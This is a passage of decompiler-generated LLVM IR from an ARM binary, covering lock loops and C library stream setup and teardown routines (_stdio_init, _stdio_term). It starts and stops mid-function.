  %v1_165e4 = inttoptr i32 %v0_165e4 to i32*
  %v2_165e4 = load i32, i32* %v1_165e4, align 4
  store i32 %v2_165e4, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_165e4, i32* %r2.global-to-local, align 4
  %v2_165f083 = load i32, i32* %v1_165e4, align 4
  store i32 %v2_165f083, i32* %r3.global-to-local, align 4
  %v3_165f485 = icmp uge i32 %v2_165f083, %v2_165e4
  store i1 %v3_165f485, i1* %cpsr_c.global-to-local, align 1
  %v9_165f491 = icmp eq i32 %v2_165f083, %v2_165e4
  br i1 %v9_165f491, label %dec_label_pc_165fc, label %dec_label_pc_16614

dec_label_pc_165fc:                               ; preds = %dec_label_pc_165e4, %dec_label_pc_165fc.dec_label_pc_165f0_crit_edge
  %v0_165fc92 = phi i32 [ %v1_165f4.pre, %dec_label_pc_165fc.dec_label_pc_165f0_crit_edge ], [ %v2_165e4, %dec_label_pc_165e4 ]
  store i32 %v0_165fc92, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1660c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1660c, label %dec_label_pc_16610, label %dec_label_pc_165fc.dec_label_pc_165f0_crit_edge

dec_label_pc_165fc.dec_label_pc_165f0_crit_edge:  ; preds = %dec_label_pc_165fc
  %v0_165f0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_165f4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_165f0 = inttoptr i32 %v0_165f0.pre to i32*
  %v2_165f0 = load i32, i32* %v1_165f0, align 4
  store i32 %v2_165f0, i32* %r3.global-to-local, align 4
  %v3_165f4 = icmp uge i32 %v2_165f0, %v1_165f4.pre
  store i1 %v3_165f4, i1* %cpsr_c.global-to-local, align 1
  %v9_165f4 = icmp eq i32 %v2_165f0, %v1_165f4.pre
  br i1 %v9_165f4, label %dec_label_pc_165fc, label %dec_label_pc_16614

dec_label_pc_16610:                               ; preds = %dec_label_pc_165fc
  %v0_16610 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16610, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16614

dec_label_pc_16614:                               ; preds = %dec_label_pc_165e4, %dec_label_pc_165fc.dec_label_pc_165f0_crit_edge, %dec_label_pc_16610
  %v0_1661c = phi i32 [ %v0_16610, %dec_label_pc_16610 ], [ %v2_165f083, %dec_label_pc_165e4 ], [ %v2_165f0, %dec_label_pc_165fc.dec_label_pc_165f0_crit_edge ]
  %v1_16614 = phi i32 [ %v0_16610, %dec_label_pc_16610 ], [ %v2_165e4, %dec_label_pc_165e4 ], [ %v1_165f4.pre, %dec_label_pc_165fc.dec_label_pc_165f0_crit_edge ]
  %v3_16614 = icmp uge i32 %v0_1661c, %v1_16614
  store i1 %v3_16614, i1* %cpsr_c.global-to-local, align 1
  %v9_16614 = icmp eq i32 %v0_1661c, %v1_16614
  br i1 %v9_16614, label %dec_label_pc_1661c, label %dec_label_pc_16614.dec_label_pc_165e4_crit_edge

dec_label_pc_16614.dec_label_pc_165e4_crit_edge:  ; preds = %dec_label_pc_16614
  %v0_165e4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_165e4

dec_label_pc_1661c:                               ; preds = %dec_label_pc_16614
  %v2_1661c = icmp ne i32 %v1_16614, 0
  store i1 %v2_1661c, i1* %cpsr_c.global-to-local, align 1
  %v7_16620 = icmp slt i32 %v1_16614, 2
  br i1 %v7_16620, label %dec_label_pc_1663c, label %dec_label_pc_16624

dec_label_pc_16624:                               ; preds = %dec_label_pc_1661c
  %v0_16624 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_16624, i32* %r0.global-to-local, align 4
  %v0_16628 = load i32, i32* @r1, align 4
  %v1_16628 = add i32 %v0_16628, 129
  store i32 %v1_16628, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1663c

dec_label_pc_1663c:                               ; preds = %dec_label_pc_165a0, %dec_label_pc_16624, %dec_label_pc_1661c
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16640 = load i32, i32* @r8, align 4
  %v2_16640 = add i32 %v0_16640, 160
  %v3_16640 = inttoptr i32 %v2_16640 to i32*
  %v4_16640 = load i32, i32* %v3_16640, align 4
  store i32 %v4_16640, i32* %r0.global-to-local, align 4
  %v1_16644 = add i32 %v4_16640, 4
  %v2_16644 = inttoptr i32 %v1_16644 to i32*
  %v3_16644 = load i32, i32* %v2_16644, align 4
  %v1_16648 = add i32 %v3_16644, -1
  store i32 %v1_16648, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1664c = icmp eq i32 %v1_16648, 0
  store i32 %v1_16648, i32* %v2_16644, align 4
  br i1 %v2_1664c, label %dec_label_pc_16658, label %dec_label_pc_166c0

dec_label_pc_16658:                               ; preds = %dec_label_pc_1663c
  %v0_16658 = load i32, i32* %r3.global-to-local, align 4
  %v1_16658 = load i32, i32* %r0.global-to-local, align 4
  %v2_16658 = add i32 %v1_16658, 8
  %v3_16658 = inttoptr i32 %v2_16658 to i32*
  store i32 %v0_16658, i32* %v3_16658, align 4
  %v0_1665c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1665c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16660

dec_label_pc_16660:                               ; preds = %dec_label_pc_16690.dec_label_pc_16660_crit_edge, %dec_label_pc_16658
  %v0_16660 = phi i32 [ %v0_16660.pre, %dec_label_pc_16690.dec_label_pc_16660_crit_edge ], [ %v0_1665c, %dec_label_pc_16658 ]
  %v1_16660 = inttoptr i32 %v0_16660 to i32*
  %v2_16660 = load i32, i32* %v1_16660, align 4
  store i32 %v2_16660, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_16660, i32* %r2.global-to-local, align 4
  %v2_1666c71 = load i32, i32* %v1_16660, align 4
  store i32 %v2_1666c71, i32* %r3.global-to-local, align 4
  %v3_1667073 = icmp uge i32 %v2_1666c71, %v2_16660
  store i1 %v3_1667073, i1* %cpsr_c.global-to-local, align 1
  %v9_1667079 = icmp eq i32 %v2_1666c71, %v2_16660
  br i1 %v9_1667079, label %dec_label_pc_16678, label %dec_label_pc_16690

dec_label_pc_16678:                               ; preds = %dec_label_pc_16660, %dec_label_pc_16678.dec_label_pc_1666c_crit_edge
  %v0_1667880 = phi i32 [ %v1_16670.pre, %dec_label_pc_16678.dec_label_pc_1666c_crit_edge ], [ %v2_16660, %dec_label_pc_16660 ]
  store i32 %v0_1667880, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16688 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16688, label %dec_label_pc_1668c, label %dec_label_pc_16678.dec_label_pc_1666c_crit_edge

dec_label_pc_16678.dec_label_pc_1666c_crit_edge:  ; preds = %dec_label_pc_16678
  %v0_1666c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16670.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1666c = inttoptr i32 %v0_1666c.pre to i32*
  %v2_1666c = load i32, i32* %v1_1666c, align 4
  store i32 %v2_1666c, i32* %r3.global-to-local, align 4
  %v3_16670 = icmp uge i32 %v2_1666c, %v1_16670.pre
  store i1 %v3_16670, i1* %cpsr_c.global-to-local, align 1
  %v9_16670 = icmp eq i32 %v2_1666c, %v1_16670.pre
  br i1 %v9_16670, label %dec_label_pc_16678, label %dec_label_pc_16690

dec_label_pc_1668c:                               ; preds = %dec_label_pc_16678
  %v0_1668c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1668c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16690

dec_label_pc_16690:                               ; preds = %dec_label_pc_16660, %dec_label_pc_16678.dec_label_pc_1666c_crit_edge, %dec_label_pc_1668c
  %v0_16698 = phi i32 [ %v0_1668c, %dec_label_pc_1668c ], [ %v2_1666c71, %dec_label_pc_16660 ], [ %v2_1666c, %dec_label_pc_16678.dec_label_pc_1666c_crit_edge ]
  %v1_16690 = phi i32 [ %v0_1668c, %dec_label_pc_1668c ], [ %v2_16660, %dec_label_pc_16660 ], [ %v1_16670.pre, %dec_label_pc_16678.dec_label_pc_1666c_crit_edge ]
  %v3_16690 = icmp uge i32 %v0_16698, %v1_16690
  store i1 %v3_16690, i1* %cpsr_c.global-to-local, align 1
  %v9_16690 = icmp eq i32 %v0_16698, %v1_16690
  br i1 %v9_16690, label %dec_label_pc_16698, label %dec_label_pc_16690.dec_label_pc_16660_crit_edge

dec_label_pc_16690.dec_label_pc_16660_crit_edge:  ; preds = %dec_label_pc_16690
  %v0_16660.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16660

dec_label_pc_16698:                               ; preds = %dec_label_pc_16690
  %v2_16698 = icmp ne i32 %v1_16690, 0
  store i1 %v2_16698, i1* %cpsr_c.global-to-local, align 1
  %v7_1669c = icmp slt i32 %v1_16690, 2
  br i1 %v7_1669c, label %dec_label_pc_166c0, label %dec_label_pc_166a0

dec_label_pc_166a0:                               ; preds = %dec_label_pc_16698
  %v0_166a0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_166a0, i32* %r0.global-to-local, align 4
  %v0_166a4 = load i32, i32* @r1, align 4
  %v1_166a4 = add i32 %v0_166a4, 129
  store i32 %v1_166a4, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_166c0

dec_label_pc_166bc:                               ; preds = %dec_label_pc_16300, %dec_label_pc_162e4, %dec_label_pc_1630c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_166c0

dec_label_pc_166c0:                               ; preds = %dec_label_pc_1663c, %dec_label_pc_16698, %bb57, %dec_label_pc_16344, %dec_label_pc_166a0, %dec_label_pc_166bc
  %v0_166c0 = load i32, i32* @r5, align 4
  store i32 %v0_166c0, i32* %r0.global-to-local, align 4
  %v2_166c8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_166c8, i32* %r4.global-to-local, align 4
  store i32 %v6_162a4, i32* @r5, align 4
  store i32 %v9_162a4, i32* @r6, align 4
  store i32 %v12_162a4, i32* @r7, align 4
  store i32 %v15_162a4, i32* @r8, align 4
  ret i32 %v0_166c0

; uselistorder directives
  uselistorder i32 %v0_1668c, { 1, 0, 2 }
  uselistorder i32 %v1_16670.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16660, { 1, 0 }
  uselistorder i32 %v0_16610, { 1, 0, 2 }
  uselistorder i32 %v1_165f4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_165e4, { 1, 0 }
  uselistorder i32 %v0_1658c, { 1, 0, 2 }
  uselistorder i32 %v1_16570.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16524, { 1, 0, 2 }
  uselistorder i32 %v1_16508, { 0, 2, 1 }
  uselistorder i32 %v4_164e4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_16494.pre, { 2, 1, 0 }
  uselistorder i32 %v0_16418, { 1, 2, 0 }
  uselistorder i32 %v1_163a8, { 1, 0 }
  uselistorder i32 %v0_163a8, { 1, 0 }
  uselistorder i32 %v1_16390, { 1, 2, 0, 3 }
  uselistorder i32 %v1_16334, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 13, 12, 14 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 6, 5, 53, 7, 8, 9, 10, 11, 13, 12, 0, 15, 14, 16, 17, 18, 19, 20, 21, 23, 22, 2, 24, 25, 26, 27, 28, 29, 30, 31, 32, 35, 33, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 1, 51, 52 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 25, 22, 23, 24, 26, 27, 28 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 36, 37, 4, 5, 6, 8, 7, 0, 9, 10, 11, 34, 35, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 16384, { 75, 76, 0, 77, 38, 68, 39, 69, 40, 70, 41, 71, 42, 72, 43, 73, 18, 74, 17, 64, 16, 52, 36, 53, 3, 54, 4, 55, 5, 56, 37, 57, 6, 58, 7, 59, 8, 60, 9, 61, 10, 62, 11, 63, 35, 65, 12, 66, 13, 67, 44, 80, 14, 81, 15, 82, 19, 78, 45, 79, 21, 83, 47, 84, 48, 85, 49, 86, 20, 87, 46, 88, 89, 22, 90, 23, 91, 24, 92, 50, 93, 25, 1, 26, 94, 27, 95, 29, 96, 28, 97, 31, 98, 30, 99, 51, 100, 32, 2, 33, 101, 34, 102 }
  uselistorder i32 (i32, i32)* @__libc_open, { 8, 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 131072, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 16, 0, 15, 12, 11, 2, 1, 14, 13, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 1024, { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder i32 ()* @malloc, { 49, 48, 47, 4, 3, 2, 0, 1, 7, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 6, 5 }
  uselistorder i8 43, { 2, 0, 1 }
  uselistorder i32 ()* @free, { 12, 11, 5, 4, 3, 2, 1, 8, 7, 6, 10, 9, 0 }
  uselistorder i8 97, { 1, 0 }
  uselistorder label %dec_label_pc_166c0, { 5, 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_166bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16690, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16678, { 1, 0 }
  uselistorder label %dec_label_pc_1663c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16614, { 2, 1, 0 }
  uselistorder label %dec_label_pc_165fc, { 1, 0 }
  uselistorder label %dec_label_pc_165a0, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %dec_label_pc_16590, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16578, { 1, 0 }
  uselistorder label %dec_label_pc_16538, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_16528, { 1, 0 }
  uselistorder label %bb57, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16470, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %dec_label_pc_163d8._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_16380, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_1631c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_162e4, { 1, 2, 0 }
}

define i32 @function_166d4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_166d4:
  %v0_166d4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_166d4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_166d4
  %v5_166d4 = sdiv i32 %arg2, 16
  %v6_166d4 = and i32 %v5_166d4, %arg1
  %v5_166d8 = sdiv i32 %arg2, 256
  %v6_166d8 = and i32 %v6_166d4, %v5_166d8
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_166d4, %bb
  %v7_166dc = phi i32 [ %arg1, %dec_label_pc_166d4 ], [ %v6_166d8, %bb ]
  ret i32 %v7_166dc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %v0_1670c = call i32 @__aeabi_read_tp()
  %v3_16710 = load i16, i16* @global_var_2229c.359, align 2
  %v4_16710 = sext i16 %v3_16710 to i32
  store i32 %v4_16710, i32* @r3, align 4
  store i32 %v0_1670c, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v2_1671c = add i32 %v4_16710, %v0_1670c
  %v3_1671c = inttoptr i32 %v2_1671c to i32*
  %v4_1671c = load i32, i32* %v3_1671c, align 4
  store i32 %v4_1671c, i32* @r6, align 4
  %v1_16720 = call i32 @isatty(i32 0)
  %v2_16728 = icmp eq i32 %v1_16720, 0
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* @r4, align 4
  br i1 %v2_16728, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_16734 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 308) to i16*), align 4
  %v7_16734 = zext i16 %v5_16734 to i32
  %v2_16738 = xor i32 %v7_16734, 256
  store i32 %v2_16738, i32* @r3, align 4
  %v2_1673c = trunc i32 %v2_16738 to i16
  store i16 %v2_1673c, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 308) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_16744 = call i32 @isatty(i32 1)
  %v2_16748 = icmp eq i32 %v1_16744, 0
  br i1 %v2_16748, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_16750 = load i32, i32* @r4, align 4
  %v2_16754 = add i32 %v1_16750, 376
  %v3_16754 = inttoptr i32 %v2_16754 to i16*
  %v4_16754 = load i16, i16* %v3_16754, align 2
  %v2_16758 = xor i16 %v4_16754, 256
  store i16 %v2_16758, i16* %v3_16754, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v3_16764 = load i16, i16* @global_var_2229c.359, align 2
  %v4_16764 = sext i16 %v3_16764 to i32
  %v0_16768 = load i32, i32* @r6, align 4
  %v1_16768 = load i32, i32* @r5, align 4
  %v3_16768 = add i32 %v1_16768, %v4_16764
  %v4_16768 = inttoptr i32 %v3_16768 to i32*
  store i32 %v0_16768, i32* %v4_16768, align 4
  ret i32 %v1_16744

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_16784 = load i32, i32* @r4, align 4
  store i32 %v3_16784, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r7.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 -33100), i32* %r3.global-to-local, align 4
  %v2_16798 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 -33100) to i32*), align 4
  store i32 %v2_16798, i32* %r0.global-to-local, align 4
  %v5_16798 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 -33096) to i32*), align 4
  store i32 %v5_16798, i32* %r1.global-to-local, align 4
  %v8_16798 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 -33092) to i32*), align 4
  %v2_167a0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_167a0, i32* %r3.global-to-local, align 4
  store i32 %v2_16798, i32* %stack_var_-44, align 4
  store i32 152, i32* %r2.global-to-local, align 4
  %v4_167ac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 152) to i32*), align 4
  store i32 %v2_16798, i32* %r0.global-to-local, align 4
  store i32 %v5_16798, i32* %r1.global-to-local, align 4
  store i32 %v8_16798, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 -33112), i32* %r3.global-to-local, align 4
  %v1_167bc = inttoptr i32 %v4_167ac to i32*
  store i32 %v2_16798, i32* %v1_167bc, align 4
  %v3_167bc = add i32 %v4_167ac, 4
  %v4_167bc = inttoptr i32 %v3_167bc to i32*
  %v5_167bc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_167bc, i32* %v4_167bc, align 4
  %v6_167bc = add i32 %v4_167ac, 8
  %v7_167bc = inttoptr i32 %v6_167bc to i32*
  %v8_167bc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_167bc, i32* %v7_167bc, align 4
  %v0_167c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_167c0 = inttoptr i32 %v0_167c0 to i32*
  %v2_167c0 = load i32, i32* %v1_167c0, align 4
  store i32 %v2_167c0, i32* %r0.global-to-local, align 4
  %v3_167c0 = add i32 %v0_167c0, 4
  %v4_167c0 = inttoptr i32 %v3_167c0 to i32*
  %v5_167c0 = load i32, i32* %v4_167c0, align 4
  store i32 %v5_167c0, i32* %r1.global-to-local, align 4
  %v6_167c0 = add i32 %v0_167c0, 8
  %v7_167c0 = inttoptr i32 %v6_167c0 to i32*
  %v8_167c0 = load i32, i32* %v7_167c0, align 4
  %v2_167c4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_167c4, i32* %r3.global-to-local, align 4
  store i32 %v2_167c0, i32* %stack_var_-56, align 4
  store i32 76, i32* %r2.global-to-local, align 4
  %v0_167d0 = load i32, i32* %r7.global-to-local, align 4
  %v2_167d0 = add i32 %v0_167d0, 76
  %v3_167d0 = inttoptr i32 %v2_167d0 to i32*
  %v4_167d0 = load i32, i32* %v3_167d0, align 4
  store i32 %v4_167d0, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r2.global-to-local, align 4
  %v1_167d8 = inttoptr i32 %v4_167d0 to i32*
  %v2_167d8 = load i32, i32* %v1_167d8, align 4
  store i32 %v2_167d8, i32* %r5.global-to-local, align 4
  %v2_167dc = add i32 %v0_167d0, 160
  %v3_167dc = inttoptr i32 %v2_167dc to i32*
  %v4_167dc = load i32, i32* %v3_167dc, align 4
  store i32 %v2_167c0, i32* %r0.global-to-local, align 4
  store i32 %v5_167c0, i32* %r1.global-to-local, align 4
  store i32 %v8_167c0, i32* %r2.global-to-local, align 4
  store i32 -33124, i32* %r3.global-to-local, align 4
  %v2_167ec = add i32 %v0_167d0, -33124
  store i32 %v2_167ec, i32* %sl.global-to-local, align 4
  %v1_167f0 = inttoptr i32 %v4_167dc to i32*
  store i32 %v2_167c0, i32* %v1_167f0, align 4
  %v3_167f0 = add i32 %v4_167dc, 4
  %v4_167f0 = inttoptr i32 %v3_167f0 to i32*
  %v5_167f0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_167f0, i32* %v4_167f0, align 4
  %v6_167f0 = add i32 %v4_167dc, 8
  %v7_167f0 = inttoptr i32 %v6_167f0 to i32*
  %v8_167f0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_167f0, i32* %v7_167f0, align 4
  %v0_16880.pr = load i32, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1688016 = icmp eq i32 %v0_16880.pr, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1688818 = add i32 %v0_16880.pr, 56
  store i32 %v1_1688818, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_1688016, label %dec_label_pc_16894, label %dec_label_pc_167f8

dec_label_pc_167f8:                               ; preds = %entry, %.thread10
  %v0_167f8 = phi i32 [ %v3_1687c, %.thread10 ], [ %v0_16880.pr, %entry ]
  %v1_167f8 = add i32 %v0_167f8, 64
  %v2_167f8 = inttoptr i32 %v1_167f8 to i32*
  %v3_167f8 = load i32, i32* %v2_167f8, align 4
  store i32 %v3_167f8, i32* %r3.global-to-local, align 4
  %v0_167fc = call i32 @__aeabi_read_tp()
  store i32 %v0_167fc, i32* %r0.global-to-local, align 4
  %v1_16800 = add i32 %v0_167fc, -1168
  store i32 %v1_16800, i32* %r6.global-to-local, align 4
  %v3_16804 = icmp uge i32 %v3_167f8, %v1_16800
  store i1 %v3_16804, i1* %cpsr_c.global-to-local, align 1
  %v9_16804 = icmp eq i32 %v3_167f8, %v1_16800
  br i1 %v9_16804, label %.thread1, label %dec_label_pc_16818

.thread1:                                         ; preds = %dec_label_pc_167f8
  %v1_16808 = load i32, i32* %r5.global-to-local, align 4
  %v2_16808 = add i32 %v1_16808, 60
  %v3_16808 = inttoptr i32 %v2_16808 to i32*
  %v4_16808 = load i32, i32* %v3_16808, align 4
  %v2_1680c = add i32 %v4_16808, 1
  store i32 %v2_1680c, i32* %r3.global-to-local, align 4
  store i32 %v2_1680c, i32* %v3_16808, align 4
  br label %.thread10

dec_label_pc_16818:                               ; preds = %dec_label_pc_167f8, %dec_label_pc_16824
  %v0_16818 = load i32, i32* %r2.global-to-local, align 4
  %v1_16818 = inttoptr i32 %v0_16818 to i32*
  %v2_16818 = load i32, i32* %v1_16818, align 4
  store i32 %v2_16818, i32* %r3.global-to-local, align 4
  %v1_1681c = load i32, i32* %r4.global-to-local, align 4
  %v3_1681c = icmp uge i32 %v2_16818, %v1_1681c
  store i1 %v3_1681c, i1* %cpsr_c.global-to-local, align 1
  %v9_1681c = icmp eq i32 %v2_16818, %v1_1681c
  br i1 %v9_1681c, label %dec_label_pc_16824, label %dec_label_pc_1683c

dec_label_pc_16824:                               ; preds = %dec_label_pc_16818
  store i32 %v2_16818, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16834 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16834, label %dec_label_pc_16838, label %dec_label_pc_16818

dec_label_pc_16838:                               ; preds = %dec_label_pc_16824
  %v0_16838 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16838, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1683c

dec_label_pc_1683c:                               ; preds = %dec_label_pc_16818, %dec_label_pc_16838
  %v0_1683c = phi i32 [ %v0_16838, %dec_label_pc_16838 ], [ %v2_16818, %dec_label_pc_16818 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1683c = icmp eq i32 %v0_1683c, 0
  %v2_16848.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_1683c, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_1683c
  %v1_16848 = load i32, i32* %r6.global-to-local, align 4
  %v3_16848 = add i32 %v2_16848.pre, 64
  %v4_16848 = inttoptr i32 %v3_16848 to i32*
  store i32 %v1_16848, i32* %v4_16848, align 4
  %v1_1684c = load i32, i32* %r1.global-to-local, align 4
  %v2_1684c = load i32, i32* %r5.global-to-local, align 4
  %v3_1684c = add i32 %v2_1684c, 60
  %v4_1684c = inttoptr i32 %v3_1684c to i32*
  store i32 %v1_1684c, i32* %v4_1684c, align 4
  br label %.thread10

bb:                                               ; preds = %dec_label_pc_1683c
  %v2_16840 = add i32 %v2_16848.pre, 8
  %v3_16840 = inttoptr i32 %v2_16840 to i32*
  %v4_16840 = load i32, i32* %v3_16840, align 4
  store i32 %v4_16840, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v3_16850 = add i32 %v2_16848.pre, 20
  %v4_16850 = inttoptr i32 %v3_16850 to i32*
  store i32 %v4_16840, i32* %v4_16850, align 4
  %v1_16854 = load i32, i32* %r2.global-to-local, align 4
  %v2_16854 = trunc i32 %v1_16854 to i16
  %v3_16854 = load i32, i32* %r5.global-to-local, align 4
  %v4_16854 = inttoptr i32 %v3_16854 to i16*
  store i16 %v2_16854, i16* %v4_16854, align 2
  %v1_16858 = load i32, i32* %r3.global-to-local, align 4
  %v2_16858 = load i32, i32* %r5.global-to-local, align 4
  %v3_16858 = add i32 %v2_16858, 24
  %v4_16858 = inttoptr i32 %v3_16858 to i32*
  store i32 %v1_16858, i32* %v4_16858, align 4
  %v1_1685c = load i32, i32* %r3.global-to-local, align 4
  %v2_1685c = load i32, i32* %r5.global-to-local, align 4
  %v3_1685c = add i32 %v2_1685c, 28
  %v4_1685c = inttoptr i32 %v3_1685c to i32*
  store i32 %v1_1685c, i32* %v4_1685c, align 4
  %v1_16860 = load i32, i32* %r3.global-to-local, align 4
  %v2_16860 = load i32, i32* %r5.global-to-local, align 4
  %v3_16860 = add i32 %v2_16860, 16
  %v4_16860 = inttoptr i32 %v3_16860 to i32*
  store i32 %v1_16860, i32* %v4_16860, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread1, %.thread5, %bb
  %v0_16864 = load i32, i32* %sl.global-to-local, align 4
  %v1_16864 = inttoptr i32 %v0_16864 to i32*
  %v2_16864 = load i32, i32* %v1_16864, align 4
